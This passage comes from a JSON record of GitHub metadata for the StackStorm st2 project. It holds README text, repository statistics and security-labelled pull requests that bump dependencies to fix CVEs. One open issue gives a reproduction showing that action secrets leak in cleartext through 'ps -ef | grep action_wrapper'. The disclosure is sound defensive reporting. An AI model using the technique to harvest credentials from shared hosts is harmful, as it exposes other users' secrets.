other monitoring, running a series of diagnostic checks on physical nodes, OpenStack or Amazon instances, and application components, and posting results to a shared communication context, like Slack or JIRA.\n* **Automated remediation** - identifying and verifying hardware failure on OpenStack compute node, properly evacuating instances and emailing VM about potential downtime, but if anything goes wrong - freezing the workflow and calling PagerDuty to wake up a human.\n* **Continuous deployment** - build and test with Jenkins, provision a new AWS cluster, turn on some traffic with the load balancer, and roll-forth or roll-back based on NewRelic app performance data.\n\nStackStorm helps you compose these and other operational patterns as rules and workflows or actions; and these rules and workflows - the content within the StackStorm platform - are stored *as code* which means they support the same approach to collaboration that you use today for code development and can be shared with the broader open source community via [StackStorm Exchange](https://exchange.stackstorm.org).\n\n### Who is using StackStorm?\n\nSee the list of known StackStorm [ADOPTERS.md](/ADOPTERS.md) and [Thought Leaders](https://stackstorm.com/stackstorm-thought-leaders/).\n\n### How it works\n\n#### StackStorm architecture\n\n![StackStorm architecture diagram](https://user-images.githubusercontent.com/597113/92291633-6b5aae00-eece-11ea-912e-3bf977aa3cea.png)\n\nStackStorm plugs into the environment via an extensible set of adapters: sensors and actions.\n\n* **Sensors** are Python plugins for inbound integration that watch for events from external systems and fire a StackStorm trigger when an event happens.\n\n* **Triggers** are StackStorm representations of external events. There are generic triggers (e.g., timers, webhooks) and integration triggers (e.g., Sensu alert, JIRA issue updated). A new trigger type can be defined by writing a sensor plugin.\n\n* **Actions** are StackStorm outbound integrations. There are generic actions (SSH, HTTP request), integrations (OpenStack, Docker, Puppet), or custom actions. Actions are either Python plugins, or any scripts, consumed into StackStorm by adding a few lines of metadata. Actions can be invoked directly by user via CLI, API, or the web UI, or used and called as part of automations - rules and workflows.\n\n* **Rules** map triggers to actions (or to workflows), applying matching criterias and map trigger payload data to action inputs.\n\n* **Workflows** stitch actions together into \"uber-actions\", defining the order, transition conditions, and passing context data from one action to the next. Most automations are multi-step (eg: more than one action). Workflows, just like \"atomic\" actions, are available in the action library, and can be invoked manually or triggered by rules.\n\n* **Packs** are the units of content deployment. They simplify the management and sharing of StackStorm pluggable content by grouping integrations (triggers and actions) and automations (rules and workflows). A growing number of packs is available on the StackStorm Exchange. Users can create their own packs,  share them on GitHub, or submit them to the StackStorm Exchange organization.\n\n* **Audit trail** is the historical list of action executions, manual or automated, and is recorded and stored with full details of triggering context and execution results. It is also captured in audit logs for integrating with external logging and analytical tools: LogStash, Splunk, statsd, or syslog.\n\nStackStorm is a service with modular architecture. It is comprised of loosely coupled microservice components that communicate over a message bus, and scales horizontally to deliver automation at scale. StackStorm has a full REST API, CLI client, and web UI for admins and users to operate it locally or remotely, as well as Python client bindings for developer convenience.\n\nStackStorm is an established project and remains actively developed by a broad community.\n\n## Documentation\n\nAdditional documentation, including installation procedures, action/rule/workflow authoring, and how to setup and use triggers/sensors can be found at [https://docs.stackstorm.com](https://docs.stackstorm.com).\n\n## Hacking / Contributing\n\nTo set up a development environment and run StackStorm from sources, follow [these instructions](https://docs.stackstorm.com/development/sources.html).\n\nFor information on how to contribute, our style guide, coding conventions and more,\nplease visit the [Development section](https://docs.stackstorm.com/development/index.html)\nin our documentation.\n\n## Security\n\nIf you believe you found a security issue or a vulnerability, please send a description of it to\nour private mailing list at info [at] stackstorm [dot] com.\n\nOnce you've submitted an issue, you should receive an acknowledgment from one our of team members\nin 48 hours or less. If further action is necessary, you may receive additional follow-up emails.\n\nFor more information, please refer to https://docs.stackstorm.com/latest/security.html\n\n## Copyright, License, and Contributor Agreement\n\nCopyright 2020 The StackStorm Authors.\nCopyright 2019 Extreme Networks, Inc.\nCopyright 2014-2018 StackStorm, Inc.\n\nLicensed under the Apache License, Version 2.0 (the \"License\"); you may not use this work except in compliance with the License. You may obtain a copy of the License in the [LICENSE](LICENSE) file, or at:\n\n[http://www.apache.org/licenses/LICENSE-2.0](http://www.apache.org/licenses/LICENSE-2.0)\n\nBy contributing you agree that these contributions are your own (or approved by your employer) and you grant a full, complete, irrevocable copyright license to all users and developers of the project, present and future, pursuant to the license of the project.\n",
        "num_commits": 22223,
        "project_age_days": 3843,
        "project_created_at": "2014-04-23",
        "latest_updated_at": "2024-10-29",
        "latest_pushed_at": "2024-10-26",
        "num_contributors": 156,
        "num_pull": 4337,
        "num_issues": 5940,
        "num_opening_issue": 589,
        "project_size(kB)": 41910,
        "num_stargazers": 6074,
        "num_watchers": 6074,
        "num_forks": 749,
        "num_subscribers": 168,
        "SecurityPolicy_created_at": "2019-07-10 19:23:43",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "b99d5dfbae33ed6334ccde54f14a6bc6221d7ccf",
                "url": "https://github.com/StackStorm/st2/commit/b99d5dfbae33ed6334ccde54f14a6bc6221d7ccf",
                "date": "2019-07-10 19:23:43"
            }
        ],
        "project_security_labels": [
            "security"
        ],
        "security_issues": [
            {
                "url": "https://github.com/StackStorm/st2/pull/6072",
                "title": "Update importlib-metadata (security)",
                "labels": [
                    "security",
                    "size/S"
                ],
                "user": "arm4b",
                "issue_author_association": "MEMBER",
                "number": 6072,
                "id": 2011029481,
                "state": "closed",
                "project_created_at": "2023-11-26T12:50:29Z",
                "closed_at": "2023-11-27T07:55:58Z",
                "body": "Extract from #6062 by @jk464 changes to update a single `importlib-metadata` dependency in this PR, as the other change related to `requests` in the beforementioned PR fails to build.\r\n\r\nThis will install importlib-metadata==4.10.1 (security fixed) under py3.8 and importlib-metadata==4.8.3 (latest available, vulnerable) under py3.6.\r\n\r\nAddress https://github.com/python/importlib_metadata/issues/361 under py3.8.\r\n\r\nWe should drop py3.6 support ASAP after v3.8.1 patch release.",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/6072",
                    "merged_at": "2023-11-27T07:55:58Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/6063",
                "title": "Update gitpython (security)",
                "labels": [
                    "enhancement",
                    "security",
                    "size/S"
                ],
                "user": "arm4b",
                "issue_author_association": "MEMBER",
                "number": 6063,
                "id": 1986207619,
                "state": "closed",
                "project_created_at": "2023-11-09T18:45:08Z",
                "closed_at": "2023-11-23T06:07:43Z",
                "body": "Taking one dependency at a time into a separated PRs from https://github.com/StackStorm/st2/pull/6062 to see what could be merged safely ASAP.\r\n\r\nThis updates `gitpython==3.1.37` (security fixed) under py3.8 and `gitpython==3.1.18` (latest installable, but vulnerable) under py3.6\r\n\r\nChecking the build artifacts for shipped gitpython versions:\r\n- U18 (py3.6) - `gitpython==3.1.18`  [(build)](https://app.circleci.com/pipelines/github/StackStorm/st2/4214/workflows/b4932a80-0076-40da-8ab8-393998fbcf6f/jobs/16002?invite=true#step-109-835718_90)\r\n- U20 (py3.8) - `gitpython==3.1.37` ([build](https://app.circleci.com/pipelines/github/StackStorm/st2/4214/workflows/b4932a80-0076-40da-8ab8-393998fbcf6f/jobs/16002/parallel-runs/1?filterBy=ALL&invite=true#step-109-834745_90))\r\n- EL7 (py3.6) - `gitpython==3.1.18` ([build](https://app.circleci.com/pipelines/github/StackStorm/st2/4214/workflows/b4932a80-0076-40da-8ab8-393998fbcf6f/jobs/16002/parallel-runs/2?filterBy=ALL&invite=true#step-109-835226_90))\r\n- EL8 (py3.8) - `gitpython==3.1.37` ([build](https://app.circleci.com/pipelines/github/StackStorm/st2/4214/workflows/b4932a80-0076-40da-8ab8-393998fbcf6f/jobs/16002/parallel-runs/3?filterBy=ALL&invite=true#step-109-851189_90))\r\n\r\nWe should drop the Python 3.6 support after the `3.8.1` patch release and pin githpython explicitly.",
                "comments": [
                    {
                        "body": "@amanda11 Experimented a bit and found that in the `pants` settings we rely on interval between `python3.6` (inclusive) until `python3.10`:\r\nhttps://github.com/StackStorm/st2/blob/32a243a2ed54c5233e10f08b69f0cb21e2f10cb7/pants.toml#L105-L112\r\n\r\nAccording to that, `gitpython==3.1.18` for py3.6 is the correct version for the pants lock as it satisfies all the python version requirements. I tried and it wasn't possible to install dynamically specific package version depending on the `python_version` marker.\r\n\r\nChecking further, if we remove py3.6 from the pants settings, then it would allow using a higher version of gitpython in the lockfile. Not sure if we want to drop py3.6 from pants now or in the v3.9.0 per #6064\r\n",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-11-10T20:29:51Z",
                        "url": "https://github.com/StackStorm/st2/pull/6063#issuecomment-1806392481"
                    },
                    {
                        "body": "_Update:_ Yeah, removing py3.6 from pants will try to regenerate all the requirements/lockfile - it probably fits a dedicated PR in the larger scope of `v3.9.0`.\r\n",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-11-10T21:20:53Z",
                        "url": "https://github.com/StackStorm/st2/pull/6063#issuecomment-1806449604"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/6063",
                    "merged_at": "2023-11-23T06:07:43Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/6062",
                "title": "Update requests to fix CVEs (security)",
                "labels": [
                    "security",
                    "size/S"
                ],
                "user": "jk464",
                "issue_author_association": "CONTRIBUTOR",
                "number": 6062,
                "id": 1979966642,
                "state": "closed",
                "project_created_at": "2023-11-06T20:02:31Z",
                "closed_at": "2024-04-26T00:05:47Z",
                "body": "Fixes up a host of CVEs in the `st2` package:\r\n\r\nNote: The `XRAY` references are vulnerabilities listed by [JFrog Xray](https://jfrog.com/help/r/get-started-with-the-jfrog-platform/jfrog-xray), that don't seem to have a corresponding CVE. JFrog doesn't seem to publish these references publicly - but I've linked to the issue disclosing the vulnerability thats referenced by the `XRAY` entry.\r\n\r\n# Bump cryptography to 41.0.4, pyopenssl to 23.2.0\r\n\r\nFixes:\r\n* [CVE-2023-4807](https://nvd.nist.gov/vuln/detail/CVE-2023-4807)\r\n* [CVE-2023-2650](https://nvd.nist.gov/vuln/detail/CVE-2023-2650)\r\n* [CVE-2023-3446](https://nvd.nist.gov/vuln/detail/CVE-2023-3446)\r\n\r\npyopenssl 23.2.0 required for cryptography to 41.0.x support\r\n\r\n# Bump virtualenv to 20.16.7\r\n\r\nFixes:\r\n* [CVE-2019-20916](https://nvd.nist.gov/vuln/detail/CVE-2019-20916)\r\n\r\n# Bump importlib-metadata to 4.10.1\r\n\r\nFixes:\r\n* [XRAY-195083](https://github.com/python/importlib_metadata/issues/361)\r\n\r\n# Bump requests to 2.31.0\r\n\r\nFixes:\r\n* [CVE-2023-32681](https://nvd.nist.gov/vuln/detail/CVE-2023-32681)\r\n\r\n# Bump gitpython to 3.1.37\r\n\r\nFixes:\r\n* [CVE-2023-40267](https://nvd.nist.gov/vuln/detail/CVE-2023-40267)\r\n* [CVE-2023-41040](https://nvd.nist.gov/vuln/detail/CVE-2023-41040)\r\n* [CVE-2023-40590](https://nvd.nist.gov/vuln/detail/CVE-2023-40590)\r\n* [CVE-2022-24439](https://nvd.nist.gov/vuln/detail/CVE-2022-24439)\r\n* [XRAY-198950](https://huntr.com/bounties/8549d81f-dc45-4af7-9f2a-2d70752d8524/)\r\n\r\n# Supercedes/Implements\r\n\r\n* https://github.com/StackStorm/st2/pull/6059\r\n* https://github.com/StackStorm/st2/pull/6058\r\n* https://github.com/StackStorm/st2/pull/6057\r\n* https://github.com/StackStorm/st2/pull/6056\r\n* https://github.com/StackStorm/st2/pull/6054\r\n* https://github.com/StackStorm/st2/pull/6053",
                "comments": [
                    {
                        "body": "@armab As you can probably see from my commits I've hit a bit of a depedency hell trying to get requirement ranges that:\r\n\r\n* Allow the last supported py3.6\r\n* A version with relevant CVEs fixed in py3.8\r\n\r\nI can see in https://github.com/StackStorm/st2/pull/6063 you've hopefully got `gitpython` handled.\r\n\r\nI'll probably do the same as you here and split this into bit size PRs to make it more manageable.\r\n\r\nI did look at fixing `fixate-requriements.py` to support reading `python_version` which I actually got working (See https://github.com/StackStorm/st2/pull/6062/commits/61b47db603c7d21a06142228f031713ba77d7a35) (which is probably worth having, even after dropping py3.6 in `3.9.0`) - issue I hit was the `stackstorm/packagingbuild:bionic` was missing the package that I wanted to using (`packaging`) so that image would also need bumped.\r\n\r\nIf you think its worth our time adding that support, I'll take a look at updating the image as well :)",
                        "user": "jk464",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-11-11T12:56:03Z",
                        "url": "https://github.com/StackStorm/st2/pull/6062#issuecomment-1806810177"
                    },
                    {
                        "body": "@jk464 Your enhancement to fixate-requriements.py looks really clean. But overall I felt like env markers are buggy in many places, including older pip version we're locked to (because of py3.6) and even pants that doesn't support them in requirements-pants.txt so touching them might be like opening a can of worms.\r\nI hope the builds would be migrated to pants from all the old machinery and so `fixate-requriements.py` may be obsolete by then.\r\n\r\n@cognifloyd do you think it's doable to migrate to the pants builds in the upcoming v3.9.0? ",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-11-11T13:46:31Z",
                        "url": "https://github.com/StackStorm/st2/pull/6062#issuecomment-1806821668"
                    },
                    {
                        "body": "So at least `importlib-metadata` changes are extracted into a dedicated PR which could be merged ASAP: https://github.com/StackStorm/st2/pull/6072\r\n",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-11-26T13:15:42Z",
                        "url": "https://github.com/StackStorm/st2/pull/6062#issuecomment-1826782003"
                    },
                    {
                        "body": "@armab if the build is failing for `requests` and the update to `importlib-metadata` was merged in #6072 is there anything left to do in this PR?\r\n\r\nThe only CVE I see listed against `requests` is [CVE-2023-32681](https://nvd.nist.gov/vuln/detail/CVE-2023-32681) - which is only `medium` Sev - so I think we could just drop fixing that to `3.9.0` at which point we can(?) drop python `3.6` and bump this w/o issue. (And I assume for `3.9.0` we'd probably rather being bumping dependencies to the highest support by `3.8`.)\r\n\r\nLet me know what you think and I can close this PR if there's nothing further to do",
                        "user": "jk464",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-11-27T11:59:46Z",
                        "url": "https://github.com/StackStorm/st2/pull/6062#issuecomment-1827696254"
                    },
                    {
                        "body": "@jk464 Yeah, let's reassign this PR to the `v3.9.0` roadmap\r\nIt'll be a reminder that `requests` will need an update after dropping the py3.6.\r\n",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-11-27T18:51:12Z",
                        "url": "https://github.com/StackStorm/st2/pull/6062#issuecomment-1828427234"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/6062",
                    "merged_at": null
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/6061",
                "title": "Bump eventlet to fix setting SSLContext minimum_version property that results in RecursionErrors",
                "labels": [
                    "enhancement",
                    "security",
                    "size/M"
                ],
                "user": "jk464",
                "issue_author_association": "CONTRIBUTOR",
                "number": 6061,
                "id": 1979789546,
                "state": "closed",
                "project_created_at": "2023-11-06T18:21:41Z",
                "closed_at": "2023-11-06T22:29:55Z",
                "body": "While writing a sensor for st2 - we hit this error:\r\n\r\n```\r\nstackstorm-docker-compose-st2sensorcontainer-1  | 2023-10-24 14:23:28,648 WARNING [-] Sensor \"PollPagerDuty\" run method raised an exception: maximum recursion depth exceeded while calling a Python object.\r\nstackstorm-docker-compose-st2sensorcontainer-1  | Traceback (most recent call last):\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/st2/lib/python3.8/site-packages/st2reactor/container/sensor_wrapper.py\", line 285, in run\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     self._sensor_instance.run()\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/st2/lib/python3.8/site-packages/st2reactor/sensor/base.py\", line 121, in run\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     self.poll()\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/packs/****_pagerduty/sensors/poll_pagerduty.py\", line 27, in poll\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     self._detect_triggered_incidents()\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/packs/****_pagerduty/sensors/poll_pagerduty.py\", line 42, in _detect_triggered_incidents\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     incidents = self.pagerduty.list_all(\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/virtualenvs/****_pagerduty/lib/python3.8/site-packages/pdpyras.py\", line 1911, in list_all\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     return list(self.iter_all(url, **kw))\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/virtualenvs/****_pagerduty/lib/python3.8/site-packages/pdpyras.py\", line 1788, in iter_all\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     self.get(url, params=data.copy()),\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/st2/lib/python3.8/site-packages/requests/sessions.py\", line 602, in get\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     return self.request(\"GET\", url, **kwargs)\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/virtualenvs/****_pagerduty/lib/python3.8/site-packages/pdpyras.py\", line 1121, in request\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     response = self.parent.request(method, full_url, **req_kw)\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/st2/lib/python3.8/site-packages/requests/sessions.py\", line 589, in request\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     resp = self.send(prep, **send_kwargs)\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/st2/lib/python3.8/site-packages/requests/sessions.py\", line 703, in send\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     r = adapter.send(request, **kwargs)\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/st2/lib/python3.8/site-packages/requests/adapters.py\", line 486, in send\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     resp = conn.urlopen(\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/st2/lib/python3.8/site-packages/urllib3/connectionpool.py\", line 790, in urlopen\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     response = self._make_request(\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/st2/lib/python3.8/site-packages/urllib3/connectionpool.py\", line 467, in _make_request\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     self._validate_conn(conn)\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/st2/lib/python3.8/site-packages/urllib3/connectionpool.py\", line 1092, in _validate_conn\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     conn.connect()\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/st2/lib/python3.8/site-packages/urllib3/connection.py\", line 642, in connect\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     sock_and_verified = _ssl_wrap_socket_and_match_hostname(\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/st2/lib/python3.8/site-packages/urllib3/connection.py\", line 735, in _ssl_wrap_socket_and_match_hostname\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     context = create_urllib3_context(\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/opt/stackstorm/st2/lib/python3.8/site-packages/urllib3/util/ssl_.py\", line 292, in create_urllib3_context\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     context.minimum_version = TLSVersion.TLSv1_2\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/usr/lib/python3.8/ssl.py\", line 586, in minimum_version\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     super(SSLContext, SSLContext).minimum_version.__set__(self, value)\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/usr/lib/python3.8/ssl.py\", line 586, in minimum_version\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     super(SSLContext, SSLContext).minimum_version.__set__(self, value)\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/usr/lib/python3.8/ssl.py\", line 586, in minimum_version\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     super(SSLContext, SSLContext).minimum_version.__set__(self, value)\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   [Previous line repeated 487 more times]\r\nstackstorm-docker-compose-st2sensorcontainer-1  |   File \"/usr/lib/python3.8/ssl.py\", line 584, in minimum_version\r\nstackstorm-docker-compose-st2sensorcontainer-1  |     if value == TLSVersion.SSLv3:\r\nstackstorm-docker-compose-st2sensorcontainer-1  | RecursionError: maximum recursion depth exceeded while calling a Python object\r\n```\r\n\r\nWhich after some digging seems to be this issue here for eventlet - https://github.com/eventlet/eventlet/issues/726\r\n\r\nBumping `evenlet` to `0.33.3` fixes this (and requires bumping `gunicorn` to `21.2.0` to support the new version of `eventlet`)\r\n\r\nThis supersedes https://github.com/StackStorm/st2/pull/5257.\r\n\r\nIt also has the added benefit of resolving - [CVE-2021-21419](https://nvd.nist.gov/vuln/detail/cve-2021-21419) (see [Improper Handling of Highly Compressed Data (Data Amplification) and Memory Allocation with Excessive Size Value in eventlet ](https://github.com/eventlet/eventlet/security/advisories/GHSA-9p9m-jm8w-94p2))",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/6061",
                    "merged_at": "2023-11-06T22:29:55Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/6055",
                "title": "Update cryptography and pyOpenSSL (security)",
                "labels": [
                    "enhancement",
                    "security",
                    "external dependency",
                    "size/M"
                ],
                "user": "arm4b",
                "issue_author_association": "MEMBER",
                "number": 6055,
                "id": 1975025476,
                "state": "closed",
                "project_created_at": "2023-11-02T20:58:17Z",
                "closed_at": "2023-11-03T20:32:52Z",
                "body": "Update cryptography as well as compatible with it version of pyOpenSSL and paramiko.\r\n* https://cryptography.io/en/latest/changelog/#v39-0-1\r\n* https://www.pyopenssl.org/en/23.1.0/changelog.html\r\n* https://www.paramiko.org/changelog.html#2.11.0\r\n",
                "comments": [
                    {
                        "body": "Yay, RFR!\r\nThat was quite a rabbit hole 🐰 \r\n",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-11-03T14:50:37Z",
                        "url": "https://github.com/StackStorm/st2/pull/6055#issuecomment-1792584211"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/6055",
                    "merged_at": "2023-11-03T20:32:52Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/6050",
                "title": "Update Orquesta to v1.6.0",
                "labels": [
                    "security",
                    "size/S"
                ],
                "user": "arm4b",
                "issue_author_association": "MEMBER",
                "number": 6050,
                "id": 1962273611,
                "state": "closed",
                "project_created_at": "2023-10-25T21:39:58Z",
                "closed_at": "2023-11-20T18:45:25Z",
                "body": "Update Orquesta to v1.6.0 to be included in the next st2 release.\r\nOrquesta v1.6.0 comes with some updated dependencies.\r\n",
                "comments": [
                    {
                        "body": "Yeah, I tried to go with updating `fixate-requirements.txt` script to support duplicate requirements with markers (for different python versions added in orquestra requirements.txt).\r\n\r\nBut went alternative way by unpinning the `networkx` in the st2 requirements, because the specific version is requested and installed by the `orquesta` dependencies here:  https://github.com/Stealthii/orquesta/blob/7dadd4cfa0e01a2fd65a545fbcdaad363bee4c68/requirements.txt#L5-L7\r\n```\r\nnetworkx>=2.5.1,<2.6; python_version < '3.7'\r\nnetworkx>=2.6,<3; python_version >= '3.7'\r\n```\r\n\r\nI'm getting what I want during the build stage:\r\n- U18 (py3.6): [networkx==2.5.1](https://app.circleci.com/pipelines/github/StackStorm/st2/4158/workflows/11838dac-5adc-4554-9a87-f7bf506bedb6/jobs/15940/parallel-runs/0?filterBy=ALL&invite=true#step-109-806306_65)\r\n- U20 (py3.8): [networkx==2.8.8](https://app.circleci.com/pipelines/github/StackStorm/st2/4158/workflows/11838dac-5adc-4554-9a87-f7bf506bedb6/jobs/15940/parallel-runs/1?filterBy=ALL&invite=true#step-109-806220_61)\r\n- EL8 (py3.8): [networkx==2.8.8](https://app.circleci.com/pipelines/github/StackStorm/st2/4158/workflows/11838dac-5adc-4554-9a87-f7bf506bedb6/jobs/15940/parallel-runs/1?filterBy=ALL&invite=true#step-109-806220_61)\r\n\r\nNow the only blocker is 🔴  `EL7` (py3.6) which is getting the `python_version` markers wrong (or ignoring them?) for some reason taking [this](https://github.com/Stealthii/orquesta/blob/7dadd4cfa0e01a2fd65a545fbcdaad363bee4c68/requirements.txt#L7) requirement line for `py3.8` instead:\r\nhttps://app.circleci.com/pipelines/github/StackStorm/st2/4158/workflows/11838dac-5adc-4554-9a87-f7bf506bedb6/jobs/15940?invite=true#step-109-929748_119\r\n```\r\n[package: st2] [18:59:09]      ERROR: pip's legacy dependency resolver does not consider dependency conflicts when selecting packages. This behaviour is the source of the following dependency conflicts.\r\n[package: st2] [18:59:09]      networkx 2.5.1 requires decorator<5,>=4.3, but you'll have decorator 5.1.1 which is incompatible.\r\nWRONG ----> [package: st2] [18:59:09]      orquesta 1.6.0 requires networkx<3,>=2.6, but you'll have networkx 2.5.1 which is incompatible.\r\n```\r\n\r\n\r\nI'm guessing something is outdated related to the build env for EL7 that doesn't quite work with dependency markers.\r\n@cognifloyd @nzlosh @amanda11  Any ideas to try?",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-10-26T19:24:37Z",
                        "url": "https://github.com/StackStorm/st2/pull/6050#issuecomment-1781768549"
                    },
                    {
                        "body": "Figured it out in https://github.com/StackStorm/st2-packages/pull/728, - which is RFR now (this PR relies on that st2-packages branch).\r\nNeed to fix e2e tests first before merging this, but this PR is RFR too.\r\n",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-10-27T13:36:19Z",
                        "url": "https://github.com/StackStorm/st2/pull/6050#issuecomment-1782933536"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/6050",
                    "merged_at": "2023-11-20T18:45:25Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/5997",
                "title": "secrets for python actions capturable in cleartext using ps -ef | grep action_wrapper",
                "labels": [
                    "bug",
                    "enhancement",
                    "security"
                ],
                "user": "fdrab",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5997,
                "id": 1802134602,
                "state": "open",
                "project_created_at": "2023-07-13T04:30:06Z",
                "closed_at": null,
                "body": "## SUMMARY\r\n\r\nPython actions leak sensitive data when viewing processes\r\n\r\n### STACKSTORM VERSION\r\n\r\nst2 3.7.0, on Python 3.8.13\r\n\r\n##### OS, environment, install method\r\n\r\nRHEL8, instance and mongoDB running on the same DL360 Proliant wtih 16 core / 64G RAM configuration\r\n\r\n## Steps to reproduce the problem\r\n\r\ncreate sample flow:\r\n```\r\nname: secret_test\r\nrunner_type: python-script\r\ndescription: secrettest\r\nenabled: true\r\nentry_point: secret_test.py\r\nparameters:\r\n  secret:\r\n    type: string\r\n    description: sample_secret\r\n    required: false\r\n    position: 0\r\n    secret: true\r\n``` \r\n\r\n\r\n\r\nwith python script:\r\n```\r\nfrom st2common.runners.base_action import Action\r\nimport time\r\n\r\nclass SecretTest(Action):\r\n    def run(self, secret):\r\n        time.sleep(10)\r\n        return(True)\r\n```\r\n\r\n\r\nrun the flow and do ps -ef | grep action_wrapper:\r\n`[user@host ~]$ ps -ef | grep action_wrapper\r\nroot     1540283 1421574  1 06:17 ?        00:00:00 /opt/stackstorm/virtualenvs/testing/bin/python -u /opt/stackstorm/st2/lib/python3.8/site-packages/python_runner/python_action_wrapper.py --pack=testing --file-path=/opt/stackstorm/internal_packs/testing/actions/secret_test.py --user=fdrab --parent-args=[\"--config-file\",\"/etc/st2/st2.conf\"] --parameters={\"secret\":\"superSecretString\"} --log-level=INFO\r\nuser 1540289 1533819  0 06:17 pts/0    00:00:00 grep --color=auto action_wrapper\r\n[user@host ~]$`\r\n\r\nThis leads to secrets being printed to the screen and easily captured even by a non-root user or anyone using ps -ef | grep. Secret is still properly masked in UI and does not appear in the logs.\r\n\r\n## Expected Results\r\n\r\nI'd expect the secret parameters to be provided to the script in a secure way (even though I have no clue how).\r\n\r\n## Actual Results\r\n\r\nsecrets printed to console.",
                "comments": [
                    {
                        "body": "That's a good find!\r\n\r\nProbably not a bug, but a side effect of using CLI arguments as an input interface.\r\nIt's possible to do something with stdin as an implementation, but it will be not a CLI argument then as the idea is that you should be able to run the same python script with the same args outside of stackstorm.\r\n\r\nPerhaps it makes sense to document this side effect in the https://docs.stackstorm.com/reference/runners.html when CLI args are used.",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-07-24T15:36:42Z",
                        "url": "https://github.com/StackStorm/st2/issues/5997#issuecomment-1648153437"
                    },
                    {
                        "body": ">the idea is that you should be able to run the same python script with the same args outside of stackstorm\r\n\r\nI would understand this for some scripts, where you convert already existing scripts and adapt them to ST2, but many of the scripts I'm creating are exclusively to be used in the context of ST2 and use st2 client, or for example the SQL pack (or any pack that allows password to be an input) on stackstorm-exchange. Maybe I can work around this by using K8s, where the individual processes run in pods and hopefully what happens in pods is not capturable in trivial way such as ps -ef. \r\nOr I'll rewrite all python actions to simply not use passwords as inputs at all and instead the process would be to pre-store a password / token in the datastore as encrypted value and then fetch the value via action_service.get instead of secrets being provided as CLI params. ",
                        "user": "fdrab",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-07-26T06:49:00Z",
                        "url": "https://github.com/StackStorm/st2/issues/5997#issuecomment-1651079601"
                    },
                    {
